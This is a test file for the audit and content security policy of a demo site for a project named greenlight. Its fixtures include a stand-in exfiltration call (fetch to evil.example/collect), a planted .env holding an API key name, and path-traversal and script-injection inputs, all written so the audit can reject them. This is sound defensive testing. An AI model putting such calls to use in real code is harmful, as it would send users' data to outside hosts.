import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import vm from 'node:vm';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { REPOSITORY } from 'greenlight';
import { auditDemo } from '../scripts/demo-audit.mjs';
import { contentSecurityPolicy, inlineScriptHashes, inlineScripts, policyOf, withPolicy } from '../scripts/demo-policy.mjs';
import { addFlatSegmentNames } from '../scripts/demo-segments.mjs';
import { DEFAULT_DEMO_BASE_PATH, demoBasePath } from '@/lib/demo-base-path';
import { INSTALL_COMMANDS, REPOSITORY_URL } from '@/lib/demo';
import { DEMO_LANGUAGE_KEY, LANGUAGE_INIT_SCRIPT, chooseLanguage } from '@/lib/demo-language';
import { routeKey } from '@/lib/routes';
import { normalizePath } from '@/lib/navigation';
import { pageOf } from '@/components/demo/DemoDocument';
import { keyFindings } from '@/lib/findings';
import { sampleResult } from '@/lib/sample';

const page = (head: string, body = '<main>demo</main>') => `<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/>${head}</head><body>${body}</body></html>`;

describe('the policy of a page', () => {
  it('finds the inline scripts and not the ones that have a source', () => {
    const html = page('<script src="/a.js" async=""></script><script>one()</script><script type="module" src="/b.js"></script><script>two()</script>');
    expect(inlineScripts(html)).toEqual(['one()', 'two()']);
  });

  it('names each inline script by its hash, once, in order', () => {
    const html = page('<script>same()</script><script>same()</script><script>other()</script>');
    const hashes = inlineScriptHashes(html);
    expect(hashes).toHaveLength(2);
    expect(hashes.every((hash) => /^'sha256-[A-Za-z0-9+/]{43}='$/.test(hash))).toBe(true);
    expect([...hashes].sort()).toEqual(hashes);
  });

  it('puts the policy first in the head, before any script', () => {
    const html = withPolicy(page('<script>one()</script>'));
    expect(html.startsWith('<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script'));
    expect(policyOf(html)).toBe(contentSecurityPolicy(inlineScriptHashes(html)));
  });

  it('allows scripts from the site and the hashed ones only, and nothing unsafe', () => {
    const policy = contentSecurityPolicy(["'sha256-abc='"]);
    expect(policy).toContain("script-src 'self' 'sha256-abc='");
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("form-action 'none'");
    expect(policy).toContain("base-uri 'none'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("connect-src 'self'");
    expect(policy).not.toMatch(/unsafe|\*|https?:/);
  });

  it('refuses a page that has no head', () => {
    expect(() => withPolicy('<html></html>')).toThrow();
  });
});

describe('the audit of the built demo', () => {
  let folder: string;

  beforeEach(() => {
    folder = mkdtempSync(path.join(tmpdir(), 'greenlight-demo-'));
  });

  afterEach(() => {
    rmSync(folder, { recursive: true, force: true });
  });

  function write(name: string, text: string): void {
    const target = path.join(folder, name);
    mkdirSync(path.dirname(target), { recursive: true });
    writeFileSync(target, text);
  }

  const clean = withPolicy(page('<script src="/greenlight/a.js" async=""></script><script>self.boot=1</script>', '<a href="https://github.com/jsanchez542-hub/greenlight">repo</a>'));

  it('finds nothing wrong in a plain page', () => {
    write('index.html', clean);
    write('a.js', 'console.log(1)');
    expect(auditDemo(folder).problems).toEqual([]);
  });

  it('refuses any path of an API, the name of the key and sockets', () => {
    write('index.html', clean);
    write('a.js', 'fetch("/api/scan");const k="N8N_API_KEY";new WebSocket(u);navigator.sendBeacon(u)');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('/api/');
    expect(found).toContain('N8N_API_KEY');
    expect(found).toContain('WebSocket');
    expect(found).toContain('sendBeacon');
  });

  it('refuses a call to another site, however it is written', () => {
    write('index.html', clean);
    write('a.js', 'fetch("https://evil.example/collect");x.open("GET","http://evil.example/")');
    const found = auditDemo(folder).problems;
    expect(found.some((problem) => problem.includes('absolute address'))).toBe(true);
    expect(found.some((problem) => problem.includes('another site'))).toBe(true);
  });

  it('refuses addresses of other sites and of other people on GitHub, and accepts our own', () => {
    write('index.html', withPolicy(page('', '<a href="https://github.com/someone-else/repo">x</a><img src="https://cdn.example/x.png"/>')));
    write('ok.txt', 'https://github.com/jsanchez542-hub/greenlight/releases https://jsanchez542-hub.github.io/greenlight/ http://www.w3.org/2000/svg https://react.dev/errors/1');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('someone-else');
    expect(found).toContain('cdn.example');
    expect(found).not.toContain('ok.txt');
  });

  it('refuses a form, a password field and a page without its policy', () => {
    write('index.html', clean);
    write('form/index.html', page('', '<form action="/x"><input type="password"/></form>'));
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('contains a form');
    expect(found).toContain('password field');
    expect(found).toContain('has no content security policy');
  });

  it('refuses a policy that does not match the scripts, one that is loose and one that comes late', () => {
    write('index.html', clean);
    write('tampered/index.html', clean.replace('self.boot=1', 'self.boot=2'));
    write('loose/index.html', clean.replace("script-src 'self'", "script-src 'unsafe-inline'"));
    write('late/index.html', page('<script>x()</script>' + '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'"/>'));
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('tampered/index.html: its content security policy does not match');
    expect(found).toContain('loose/index.html: its policy allows unsafe code');
    expect(found).toContain('late/index.html');
  });

  it('refuses files that have no place in a demo, like source maps and settings', () => {
    write('index.html', clean);
    write('a.js.map', '{}');
    write('.env', 'N8N_API_KEY=x');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('a.js.map: a kind of file');
    expect(found).toContain('.env: a kind of file');
  });

  it('lets only the fallback for old browsers use XMLHttpRequest', () => {
    write('index.html', withPolicy(page('<script src="/greenlight/old.js" noModule=""></script>')));
    write('old.js', 'var x=new XMLHttpRequest;');
    write('new.js', 'var x=new XMLHttpRequest;');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('new.js: uses XMLHttpRequest');
    expect(found).not.toContain('old.js: uses');
  });
});

describe('the demo that was built, when there is one', () => {
  const built = path.resolve(import.meta.dirname, '..', 'out');
  let exists = true;
  try {
    readdirSync(built);
  } catch {
    exists = false;
  }

  it.skipIf(!exists)('passes the same audit, so a build that leaves something behind cannot be shipped', () => {
    expect(auditDemo(built).problems).toEqual([]);
  });
});

describe('the pieces a host without rewrites needs', () => {
  it('writes the dotted name of each segment file beside its folder', () => {
    const folder = mkdtempSync(path.join(tmpdir(), 'greenlight-segments-'));
    try {
      mkdirSync(path.join(folder, 'checks', '__next.KEY', 'checks'), { recursive: true });
      writeFileSync(path.join(folder, 'checks', '__next.KEY', 'checks', '__PAGE__.txt'), 'page');
      mkdirSync(path.join(folder, '__next.KEY'), { recursive: true });
      writeFileSync(path.join(folder, '__next.KEY', '__PAGE__.txt'), 'root');

      expect(addFlatSegmentNames(folder)).toBe(2);

      expect(readFileSync(path.join(folder, 'checks', '__next.KEY.checks.__PAGE__.txt'), 'utf8')).toBe('page');
      expect(readFileSync(path.join(folder, '__next.KEY.__PAGE__.txt'), 'utf8')).toBe('root');
      expect(addFlatSegmentNames(folder)).toBe(0);
    } finally {
      rmSync(folder, { recursive: true, force: true });
    }
  });
});

describe('where the demo lives', () => {
  it('defaults to the project page of the repository', () => {
    expect(demoBasePath(undefined)).toBe(DEFAULT_DEMO_BASE_PATH);
    expect(DEFAULT_DEMO_BASE_PATH).toBe('/greenlight');
  });

  it('accepts a root or a plain folder and nothing that could change an address', () => {
    expect(demoBasePath('')).toBe('');
    expect(demoBasePath('/')).toBe('');
    expect(demoBasePath('/greenlight')).toBe('/greenlight');
    expect(demoBasePath('/a/b-c_d.e')).toBe('/a/b-c_d.e');
    for (const bad of ['greenlight', '/greenlight/', '/..', '/a/../b', '/a b', '//evil.example', '/a?x=1', '/a#x', 'https://x', '/ünï', '/a\\b', '/<script>']) {
      expect(() => demoBasePath(bad), bad).toThrow();
    }
  });

  it('names the repository the way the scanner does', () => {
    expect(REPOSITORY_URL).toBe(`https://github.com/${REPOSITORY}`);
    expect(INSTALL_COMMANDS[0]).toBe(`git clone ${REPOSITORY_URL}.git`);
  });
});

describe('the language of a page with no server', () => {
  it('follows what the visitor chose, then the browser, then English', () => {
    expect(chooseLanguage('es', ['en-US'])).toBe('es');
    expect(chooseLanguage('en', ['es-ES'])).toBe('en');
    expect(chooseLanguage(null, ['fr-FR', 'es-CO', 'en'])).toBe('es');
    expect(chooseLanguage(null, ['de'])).toBe('en');
    expect(chooseLanguage(null, [])).toBe('en');
    expect(chooseLanguage('klingon', ['es'])).toBe('es');
  });

  function runScript(stored: string | null, languages: string[] | undefined, language = ''): { lang: string; pending: boolean; timers: number } {
    const attributes = new Map<string, string>();
    let timers = 0;
    const root = {
      lang: 'en',
      setAttribute: (name: string, value: string) => attributes.set(name, value),
      removeAttribute: (name: string) => attributes.delete(name),
    };
    const context = {
      document: { documentElement: root },
      localStorage: { getItem: (key: string) => (key === DEMO_LANGUAGE_KEY ? stored : null) },
      navigator: { languages, language },
      setTimeout: () => {
        timers += 1;
        return 0;
      },
    };
    vm.runInNewContext(LANGUAGE_INIT_SCRIPT, context);
    return { lang: root.lang, pending: attributes.has('data-pending'), timers };
  }

  it('is decided by the script of the head exactly as by the function, for every combination', () => {
    const stored = [null, 'es', 'en', 'fr', ''];
    const preferred: Array<string[] | undefined> = [[], ['en-US'], ['es-ES', 'en'], ['fr', 'es'], ['de', 'it'], ['ES'], ['es_MX'], undefined];
    for (const choice of stored) {
      for (const languages of preferred) {
        const expected = chooseLanguage(choice, languages ?? ['']);
        expect(runScript(choice, languages, languages === undefined ? 'es-AR' : '').lang, `${String(choice)} ${JSON.stringify(languages)}`).toBe(
          languages === undefined ? chooseLanguage(choice, ['es-AR']) : expected,
        );
      }
    }
  });

  it('holds the page back only for a language other than the one it was built in, and always lets go', () => {
    expect(runScript(null, ['en-GB'])).toMatchObject({ lang: 'en', pending: false, timers: 0 });
    expect(runScript(null, ['es'])).toMatchObject({ lang: 'es', pending: true, timers: 1 });
  });

  it('does nothing when the storage is blocked', () => {
    const root = { lang: 'en', setAttribute: () => undefined, removeAttribute: () => undefined };
    vm.runInNewContext(LANGUAGE_INIT_SCRIPT, {
      document: { documentElement: root },
      localStorage: {
        getItem: () => {
          throw new Error('blocked');
        },
      },
      navigator: { languages: ['es'] },
      setTimeout: () => 0,
    });
    expect(root.lang).toBe('en');
  });
});

describe('the pieces of the pages of the demo', () => {
  it('writes the address of a finding without colons, which a folder name cannot always hold', () => {
    expect(routeKey('orders:silent-error:0', true)).toBe('orders~silent-error~0');
    expect(routeKey('orders:silent-error:0', false)).toBe('orders:silent-error:0');
    for (const { key } of keyFindings(sampleResult.findings)) {
      expect(routeKey(key, true)).not.toMatch(/[:/\\?#%]/);
    }
  });

  it('reads a path with or without the slash a folder host puts at its end', () => {
    expect(normalizePath('/setup/')).toBe('/setup');
    expect(normalizePath('/findings/orders~silent-error~0/')).toBe('/findings/orders~silent-error~0');
    expect(normalizePath('/')).toBe('/');
    expect(normalizePath('//')).toBe('/');
    expect(normalizePath('/setup')).toBe('/setup');
  });

  it('knows which page a path is, for the title', () => {
    expect(pageOf('/')).toBe('overview');
    expect(pageOf('/findings/')).toBe('findings');
    expect(pageOf('/findings/orders~silent-error~0/')).toBe('finding');
    expect(pageOf('/workflows')).toBe('workflows');
    expect(pageOf('/workflows/orders/')).toBe('workflow');
    expect(pageOf('/checks/')).toBe('checks');
    expect(pageOf('/setup/')).toBe('setup');
    expect(pageOf('/nowhere/')).toBe('notFound');
    expect(pageOf('/constructor/')).toBe('notFound');
    expect(pageOf('/__proto__/')).toBe('notFound');
  });
});
